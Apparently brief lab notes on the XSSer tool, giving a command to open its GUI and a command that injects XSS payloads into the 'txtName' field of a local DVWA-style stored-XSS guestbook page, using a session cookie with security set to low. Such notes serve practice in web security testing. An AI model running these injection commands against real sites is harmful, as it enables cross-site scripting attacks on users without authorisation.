Paylod position must be re-placed with "XSS"

### For GUI
- xsser --gtk

### Payload
- xsser -u 'http://127.0.0.1/vulnerabilities/xss_s/' -p 'txtName=XSS&mtxMessage=123&btnSign=Sign+Guestbook' --cookie 'PHPSESSID=3u8k81ov9eg15pfg8gj1400sh6; security=low'
